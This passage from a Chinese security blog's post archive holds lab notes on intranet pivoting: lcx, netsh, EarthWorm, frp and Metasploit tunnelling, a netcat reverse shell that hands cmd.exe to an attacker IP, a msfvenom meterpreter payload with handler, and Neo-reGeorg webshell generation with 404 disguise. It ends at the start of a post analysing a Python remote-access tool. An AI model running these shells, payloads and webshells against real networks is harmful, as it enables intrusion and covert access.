<p><img src="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/image-20221118130630088.png" alt="image-20221118130630088"></p>
<h1 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h1><p>太大了太大了太大了太大了太大了太大了，py就不适合写这种东西，不会敏感操作的动态免杀。</p>
<p><img src="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20221118130359657.png" alt="image-20221118130359657"></p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>内网渗透端口转发总结</title>
    <url>/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="内网渗透端口转发总结"><a href="#内网渗透端口转发总结" class="headerlink" title="内网渗透端口转发总结"></a>内网渗透端口转发总结</h1><p>前言：之前渗透的时候，用些工具都是模模糊糊的，这次看到个不错的文章，想一次性解决这个问题。</p>
<p><a href="https://blog.csdn.net/weixin_42490383/article/details/109429764?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-109429764-blog-110393906.pc_relevant_default&spm=1001.2101.3001.4242.1&utm_relevant_index=3">(100条消息) VMware LAN区段网络设置_墨笔夺魂的博客-CSDN博客_lan区段</a></p>
<p><a href="https://blog.csdn.net/yang558855/article/details/110393906">(100条消息) VMware虚拟机网卡LAN区段模拟内网_自然之龙的博客-CSDN博客_lan区段</a></p>
<h1 id="windows版lcx介绍"><a href="#windows版lcx介绍" class="headerlink" title="windows版lcx介绍"></a>windows版lcx介绍</h1><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653017320_62870ae8645fbf7f153e3.png" alt="img"></p>
<p>环境如上，当然不是和他一样的，内网机是192.168.0.127</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912141223474.png" alt="image-20220912141223474"></p>
<p>外面ping不通，里面可以ping通。已模拟内网环境，他妈的我搭靶场的时候怎么就没有想到用这个lan网段。o(╥﹏╥)o</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">受害机执行</span><br><span class="line">lcx.exe -slave 192.168.112.1 5333 172.16.1.2 3389</span><br><span class="line">表将内网机（172.16.1.2:3389）转发到攻击机（192.168.112.1:5333）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机执行</span><br><span class="line">lcx.exe -listen 5333 5555，表将“监听到5333端口的流量”转发至5555端口上。</span><br></pre></td></tr></table></figure>

<p>最后在攻击机上登录，本机ip:5555</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912145915071.png"></p>
<h1 id="netsh端口映射"><a href="#netsh端口映射" class="headerlink" title="netsh端口映射"></a>netsh端口映射</h1><p>这个只是把本机的某个端口映射到另外一个ip地址上面，只要访问本机的这个端口就可以了。但是访问外网ip是没得办法直接连的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=7777 connectaddress=192.168.112.144 connectport=3389</span><br><span class="line"></span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653017809_62870cd130601ffb48553.png" alt="img"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912151949136.png" alt="image-20220912151949136"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy reset //删除端口转发</span><br><span class="line"></span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>

<h1 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h1><p>内网穿透神器EarthWorm（EW），功能强大的网络穿透工具，具有socks5代理、端口转发，端口映射三大功能</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912152035101.png" alt="image-20220912152035101"></p>
<h2 id="正向socks-v5"><a href="#正向socks-v5" class="headerlink" title="正向socks v5"></a>正向socks v5</h2><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912152223873.png" alt="image-20220912152223873"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912152524235.png" alt="image-20220912152524235"></p>
<p>大概就是这样喵</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win7上执行：ew_win32.exe -s lcx_tran -l 1080 -f 172.16.1.3 -g 3389</span><br><span class="line">解释：将172.16.1.3:3389代理到win7的1080端口。</span><br></pre></td></tr></table></figure>

<p>然后攻击机访问win7的1080端口就可以实现代理喵。</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912152715252.png" alt="image-20220912152715252"></p>
<h2 id="反向socks-v5-proxifier"><a href="#反向socks-v5-proxifier" class="headerlink" title="反向socks v5+proxifier"></a>反向socks v5+proxifier</h2><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018383_62870f0f9f3b794159ff6.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">物理机执行</span><br><span class="line">ew_win32.exe -s rcsocks -l 1080 -e 8888</span><br><span class="line">监听1080端口，并接收8888端口的流量。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跳板机执行</span><br><span class="line">ew_win32.exe -s rssocks -d 192.168.100.1 -e 8888</span><br><span class="line">跳板机作为ssocks，和物理机8888建立连接。</span><br></pre></td></tr></table></figure>

<p>proxifier配置代理服务器为127.0.0.1:1080</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912153327767.png" alt="image-20220912153327767"></p>
<p>这样就可以直接连接到内网的机器了</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912153359153.png" alt="image-20220912153359153"></p>
<p>要是代理关掉就连不上了</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912153436429.png" alt="image-20220912153436429"></p>
<h2 id="二级内网穿透"><a href="#二级内网穿透" class="headerlink" title="二级内网穿透"></a>二级内网穿透</h2><p>这个我就没有复现了。暂时用不到。</p>
<h3 id="lcx-tran用法"><a href="#lcx-tran用法" class="headerlink" title="lcx_tran用法"></a>lcx_tran用法</h3><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018640_628710106ca3f5c0288ce.png" alt="1653018640_628710106ca3f5c0288ce.png!small?1653018641846"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018649_628710191786de1f5e152.png" alt="1653018649_628710191786de1f5e152.png!small?1653018650516"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018658_62871022bd4575a4b753e.png" alt="1653018658_62871022bd4575a4b753e.png!small?1653018660246"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018681_62871039bf0b8f0c15f66.png!small" alt="1653018681_62871039bf0b8f0c15f66.png"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018689_628710412b40868d11805.png" alt="1653018689_628710412b40868d11805.png!small?1653018690778"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018695_6287104763d6d348a47ca.png" alt="1653018695_6287104763d6d348a47ca.png!small?1653018696848"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018705_6287105155d0356bda8cf.png" alt="1653018705_6287105155d0356bda8cf.png!small?1653018706836"></p>
<h3 id="lcx-listen-lcx-slave"><a href="#lcx-listen-lcx-slave" class="headerlink" title="lcx_listen lcx_slave"></a>lcx_listen lcx_slave</h3><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018724_6287106447d70c9f97d12.png" alt="1653018724_6287106447d70c9f97d12.png!small?1653018725702"></p>
<p>win10:ew_win32.exe -s lcx_listen -l 1080 -e 8888</p>
<p>2-win2012:ew_win32.exe -s ssocksd -l 9999</p>
<p>1-win2012:ew_win32.exe -s lcx_slave -d 192.168.112.1 -e 8888 -f 172.16.1.6 -g 9999</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018754_6287108299050b3e2e219.png" alt="1653018754_6287108299050b3e2e219.png!small?1653018756085"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018776_6287109840a9e8608c92f.png" alt="1653018776_6287109840a9e8608c92f.png!small?1653018777711"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018786_628710a245549999e8536.png" alt="1653018786_628710a245549999e8536.png!small?1653018787769"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018799_628710af95311c82220c0.png" alt="1653018799_628710af95311c82220c0.png!small?1653018801224"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018808_628710b88e21cba662216.png" alt="1653018808_628710b88e21cba662216.png!small?1653018810152"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018824_628710c8a059170b5f4c7.png" alt="1653018824_628710c8a059170b5f4c7.png!small?1653018826062"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018836_628710d43ce65782870ca.png" alt="1653018836_628710d43ce65782870ca.png!small?1653018837769"></p>
<h1 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h1><h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018870_628710f68444bc378f0f9.png" alt="1653018870_628710f68444bc378f0f9.png!small?1653018871952"></p>
<p>也就是弹个shell过来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机先监听</span><br><span class="line">nc64.exe -lvp 12345</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">受害者</span><br><span class="line">nc64.exe -e cmd.exe 172.16.1.5 12345</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912160159331.png" alt="image-20220912160159331"></p>
<p>成功</p>
<h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">受害者</span><br><span class="line">nc64.exe -lvp 12345 -e cmd.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者</span><br><span class="line">nc64.exe 172.16.1.6 12345</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912160436671.png" alt="image-20220912160436671"></p>
<p>成功</p>
<h1 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h1><p>这个也没复现了,偷别人的图</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019015_628711872bcf8e6f9ba01.png" alt="1653019015_628711872bcf8e6f9ba01.png!small?1653019016569"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> frpc.ini配置文件</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line"></span><br><span class="line">server_addr = 192.168.112.1</span><br><span class="line"></span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">token = 123</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line"></span><br><span class="line">type = tcp</span><br><span class="line"></span><br><span class="line">remote_port = 8899</span><br><span class="line"></span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019048_628711a8d2cb0a3f7ab07.png" alt="1653019048_628711a8d2cb0a3f7ab07.png!small?1653019050293"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frps.ini配置文件</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line"></span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line">token = 123</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019070_628711be4ca61a1d94286.png" alt="1653019070_628711be4ca61a1d94286.png!small?1653019071699"></p>
<p>命令执行</p>
<p>先运行：frps.exe -c frps.ini</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019107_628711e3822b0d0c5be10.png" alt="1653019107_628711e3822b0d0c5be10.png!small?1653019109087"></p>
<p>再运行：frpc.exe -c frpc.ini</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019133_628711fd95642caace23d.png" alt="1653019133_628711fd95642caace23d.png!small?1653019134996"></p>
<p>本机配代理Proxifier</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019145_62871209d4269eaa510bb.png" alt="1653019145_62871209d4269eaa510bb.png!small?1653019147326"></p>
<p>远程连接测试成功</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019156_628712147f144f722b79e.png" alt="1653019156_628712147f144f722b79e.png!small?1653019157954"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019166_6287121e510cc64335a13.png" alt="1653019166_6287121e510cc64335a13.png!small?1653019167788"></p>
<h1 id="MSF-socks隧道代理"><a href="#MSF-socks隧道代理" class="headerlink" title="MSF socks隧道代理"></a>MSF socks隧道代理</h1><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019182_6287122ec9cb3642487e4.png" alt="1653019182_6287122ec9cb3642487e4.png!small?1653019184228"></p>
<p>假设已获取winserver2008的服务器权限，用msf做演示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf生成exe木马控winserver2008</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.190.129 LPORT=12345 -f exe &gt; ./WinSer2008.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019218_62871252869d7b441dadb.png" alt="1653019218_62871252869d7b441dadb.png!small?1653019220085"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set LHOST 192.168.190.129</span><br><span class="line"></span><br><span class="line">set LPORT 12345</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019230_6287125e7d4f18a99d5e3.png" alt="1653019230_6287125e7d4f18a99d5e3.png!small?1653019232077"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019264_6287128032b424f0dacb4.png" alt="1653019264_6287128032b424f0dacb4.png!small?1653019266022"></p>
<p>然后添加路由：<code>run autoroute -s 172.16.1.0</code></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019277_6287128ddeec5a1833d50.png" alt="1653019277_6287128ddeec5a1833d50.png!small?1653019279452"></p>
<p>然后查看添加的路由：<code>run autoroute -p</code></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019301_628712a5cd1cee9b3e7fd.png" alt="1653019301_628712a5cd1cee9b3e7fd.png!small?1653019303373"></p>
<p><code>background</code></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019328_628712c0c8e3eab8cc5f6.png" alt="1653019328_628712c0c8e3eab8cc5f6.png!small?1653019330223"></p>
<p>然后搜索可以做代理的模块，并使用它：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search socks_proxy</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set username admin</span><br><span class="line"></span><br><span class="line">set password 123456</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019364_628712e47a421d4f19b9b.png" alt="1653019364_628712e47a421d4f19b9b.png!small?1653019365960"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019375_628712ef490fb48013c5a.png" alt="1653019375_628712ef490fb48013c5a.png!small?1653019377272"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019380_628712f4a2b2df36ba7a6.png" alt="1653019380_628712f4a2b2df36ba7a6.png!small"></p>
<p>然后run</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019410_62871312a890fc84de419.png" alt="1653019410_62871312a890fc84de419.png!small?1653019412131"></p>
<p>windows下proxifer测试。</p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019427_628713239297600f2ee97.png" alt="1653019427_628713239297600f2ee97.png!small?1653019429047"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019440_628713304156956afbbfb.png" alt="1653019440_628713304156956afbbfb.png!small?1653019441799"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019450_6287133a1a0081a59de2e.png" alt="1653019450_6287133a1a0081a59de2e.png!small?1653019451548"></p>
<p><code>vi /etc/proxychains.conf</code></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019478_62871356384770324c66b.png" alt="1653019478_62871356384770324c66b.png!small?1653019479666"></p>
<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019488_62871360e4ffdfe6d4efe.png" alt="1653019488_62871360e4ffdfe6d4efe.png!small?1653019490395"></p>
<p>我这没复现成功啊，不知道原因，过程和原理都是对的。</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>内网隧道之Neo-reGeorg</title>
    <url>/2022/12/31/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%B9%8BNeo-reGeorg/</url>
    <content><![CDATA[<h1 id="内网隧道之Neo-reGeorg"><a href="#内网隧道之Neo-reGeorg" class="headerlink" title="内网隧道之Neo-reGeorg"></a>内网隧道之Neo-reGeorg</h1><p>本文介绍一个HTTP隧道的工具,Neo-reGeorg。</p>
<p>是2020年的一个工具，基于python，也是比较新的一款工具了，在各大渗透人员中也广为使用。</p>
<p>所谓http隧道，就是通过上传特定脚本到网站目录进行解析，配合本地工具即可搭建隧道的方式，这种方式同样可以直达内网，这种方式复用了网站的端口，无需再开新的端口和担忧防火墙规则对流量的拦截。（我们常用的各种webshell管理工具，如冰蝎等也是可以建立http隧道的。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>工具原理也简单，就是将socket通道包裹在http协议中。</p>
<p><img src="/2022/12/31/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%B9%8BNeo-reGeorg/image-20221231141432915.png" alt="image-20221231141432915"></p>
<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成webshell</span><br><span class="line">python3 neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">连接webshell</span><br><span class="line">python3 neoreg.py -k password -u http://xx/tunnel.php</span><br><span class="line"></span><br><span class="line">伪装404</span><br><span class="line">python neoreg.py generate -k &lt;you_password&gt; --file 404.html --httpcode 404</span><br><span class="line"></span><br><span class="line">如需 Authorization 认证和定制的 Header 或 Cookie</span><br><span class="line">$ python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; -H &#x27;Authorization: cm9vdDppcyB0d2VsdmU=&#x27; --cookie &quot;key=value;key2=value2&quot;</span><br><span class="line"></span><br><span class="line">需要分散请求，可上传到多个路径上，如内存马</span><br><span class="line">python neoreg.py -k &lt;you_password&gt; -u &lt;url_1&gt; -u &lt;url_2&gt; -u &lt;url_3&gt; ...</span><br><span class="line"></span><br><span class="line">使用端口转发功能，非启动 socks5 服务 ( 127.0.0.1:1080 -&gt; ip:port )</span><br><span class="line">python neoreg.py -k &lt;you_password&gt; -u &lt;url&gt; -t &lt;ip:port&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-k：主要影响webshell文件中的随机字符串，主要位置在headers的键值。</span><br><span class="line">-f：主要影响webshell文件最后位置，exit函数运行结束后打印的html代码。</span><br><span class="line">-c：主要影响webshell文件设定的响应状态码。</span><br></pre></td></tr></table></figure>

<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p><code>python3 neoreg.py generate -k 123456</code></p>
<p>先创建webshell</p>
<p><code>python3 neoreg.py -k 123456 -u http://192.168.52.1/1.php</code></p>
<p>随后链接webshell</p>
<p><img src="/2022/12/31/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%B9%8BNeo-reGeorg/image-20221231144336130.png" alt="image-20221231144336130"></p>
<p>然后就可以通过proxychains来利用socks代理了</p>
<p>后续可能会分析源码，webshell等。</p>
]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>分析一款仅能执行命令的python远控</title>
    <url>/2022/11/13/%E5%88%86%E6%9E%90%E4%B8%80%E6%AC%BE%E4%BB%85%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84python%E8%BF%9C%E6%8E%A7/</url>
    <content><![CDATA[<h1 id="分析一款仅能执行命令的python远控"><a href="#分析一款仅能执行命令的python远控" class="headerlink" title="分析一款仅能执行命令的python远控"></a>分析一款仅能执行命令的python远控</h1><p>github上找了一个python的简单远控来进行分析，从而了解其中的一些原理。</p>
<h1 id="client端"><a href="#client端" class="headerlink" title="client端"></a>client端</h1><p>首先我们分析被控端的代码</p>
<p>太长我就不全部贴上来了，但会每一段都进行分析。</p>
<p>首先是主函数</p>
